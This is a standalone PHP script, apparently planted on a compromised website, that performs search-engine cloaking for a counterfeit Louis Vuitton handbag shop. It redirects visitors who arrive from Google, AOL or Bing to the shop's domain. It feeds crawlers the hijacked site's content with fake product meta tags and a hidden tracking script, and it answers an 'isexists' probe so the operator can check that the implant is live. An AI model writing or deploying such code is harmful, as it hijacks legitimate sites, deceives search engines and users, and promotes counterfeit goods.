<?php			
		$old_url = "http://www.cuasia.org";
		$new_url = "http://www.freeshoppinghandbags.com";
		
		$meta_title = "Louis Vuitton Alma - Louis Vuitton Alma BB Monogram Vernis M91676 [169]";
		$meta_keywords = "Louis Vuitton Alma BB Monogram Vernis M91676,Louis Vuitton Outlet,Louis Vuitton Handbags,Louis Vuitton Handbags Discount Sale,Authentic Louis Vuitton Handbags,Louis Vuitton Official Website";
		$meta_description = "Louis Vuitton Alma - Louis Vuitton Alma BB Monogram Vernis M91676 [169] - Louis Vuitton Alma BB Monogram Vernis M91676 Handbags:The Alma BB is a charming reinterpretation of one of our icons. Delightfully compact, with enough room for a phone, wallet and keys, it looks simply splendid in Monogram Vernis leather.*Size: 9.8&quot; x 7.6&quot; x 4.7&quot;?*Hand carry or shoulder carry with removable shoulder";
		$foot_tj = '<script language="javascript" type="text/javascript" src="http://js.users.51.la/16920583.js"></script>';

		$url_parent = $_SERVER['HTTP_REFERER'];	
		$url_google = "/(google\.com|aol\.com|bing\.com)/i";	

		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$user_bot = "/(googlebot|sqworm|Googlespider|msnbot)/i";	
		
		if(preg_match($url_google, $url_parent)) {
			Header("Location: " . $new_url);
		}else if(preg_match($user_bot, $user_agent)) {			
			$page_contents = file_get_contents($old_url);
				
			if($meta_title != ''){
				preg_match('/<title>(.*)<\/title>/i', $page_contents, $arr1);
				$page_contents = str_replace($arr1[0],"<title>" . $meta_title . "</title>",$page_contents);   
			}

            if($meta_description != ''){
				preg_match('/<meta(.*)name=\"description\"(.*)>/i', $page_contents, $arr3);
                if($arr3[0] != "")
				    $page_contents = str_replace($arr3[0],"<meta name=\"description\" content=\"" . $meta_description . "\" />",$page_contents);  
                else
                    $page_contents = str_replace("</title>","</title>\r\n<meta name=\"description\" content=\"" . $meta_description . "\" />",$page_contents); 
			}

            if($meta_keywords != ''){				
				preg_match('/<meta(.*)name=\"keywords\"(.*)>/i', $page_contents, $arr2);
                if($arr2[0] != "")
				    $page_contents = str_replace($arr2[0],"<meta name=\"keywords\" content=\"" . $meta_keywords . "\" />",$page_contents);  
                else
                    $page_contents = str_replace("</title>","</title>\r\n<meta name=\"keywords\" content=\"" . $meta_keywords . "\" />",$page_contents); 
			}

			if($foot_tj != ''){
				$page_contents = str_replace('</body>','<div style="display:none" >' . $foot_tj . '</div></body>',$page_contents);  
			}

			echo $page_contents;
			exit();
		}

		if(isset($_GET["isexists"])){
			echo "exists";
			exit();
		}
?>